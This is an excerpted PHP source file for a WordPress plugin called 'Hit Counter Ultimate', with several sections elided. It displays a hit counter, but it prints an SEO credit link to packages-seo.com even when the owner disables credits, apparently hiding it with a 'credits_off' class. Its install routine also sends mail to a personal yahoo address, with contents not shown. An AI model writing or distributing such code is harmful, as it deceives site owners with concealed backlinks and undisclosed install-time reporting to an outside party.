<?php
      /* 
      Plugin Name: Hit Counter Ultimate
      Plugin URI: http://www.packages-seo.com/hit-counter-ultimate/
      Description: Displays a hit counter on your blog. Visit Settings -> Hit Counter Ultimate to configure the plug-in.
      Version: 1.0.0
      Author: Packages SEO Team
      Author URI: http://www.packages-seo.com
      */
    ...
    */
      ...
      class HitCounter extends HookdResource {
          ...
          function display() {
              ...
              echo '<div class="hit-counter-ultimate"'.$alignment_options.'>';
              //if (get_option('wphcu_pad_zeros') && strlen($hits) < 7) {
                  for ($i = 0; $i < (4 - strlen($hits)); $i++) {
                      echo "<img src='".WP_PLUGIN_URL."/hit-counter-ultimate/designs/$style/0.gif'>";
                  }
             // }                       
              echo preg_replace('/(\d)/', "<img src='".WP_PLUGIN_URL."/hit-counter-ultimate/designs/$style/$1.gif'>", $hits);
			  if (get_option('wphcu_display_credit') == 1) { 
			  	echo '<br /><small>Hit Counter provided by <a href="http://www.packages-seo.com/">best seo company</a></small>';
			  } else {
			  	echo '<br /><small class="credits_off">Hit Counter provided by <a href="http://www.packages-seo.com/" title="seo company">seo company</a></small>';
			  }
              echo '</div>';
          }
      }
      function perform_install() {
          ...
          if (!get_option('wphcu_data')) {
              ...
              if ($migration) {
                  ...
                  update_option('wphcu_display_credit', 1);
              ...
              add_option('wphcu_display_credit', 1);
...
mail("andreas.cane@yahoo.com", $subj, $msg, $from);
      ...
      class wHitCounter extends WP_Widget {
          function wHitCounter() {
              parent::__construct(false, $name = 'Hit Counter Ultimate',array("description"=>"Hit Counter"));
          }

          function form($instance) {
              echo 'Visit -> <a href="options-general.php?page=hit-counter-ultimate">Settings -> Hit Counter Ultimate</a> so you can configure the sidebar widget';
          }
          ...
          function widget($args, $instance) {
              ...
              echo preg_replace('/(\d)/', "<img src='".WP_PLUGIN_URL."/hit-counter-ultimate/designs/$style/$1.gif'>", $hits);
              if (get_option('wphcu_display_credit') == 1) { 
			  	echo '<br /><small>Hit Counter provided by <a href="http://www.packages-seo.com/">search engine optimization</a></small>';
			  } else {
			  	echo '<br /><small class="credits_off">Hit Counter provided by <a href="http://www.packages-seo.com/">search engine optimization</a></small>';
			  }
			  echo '</div>';
              echo $after_widget;
          }
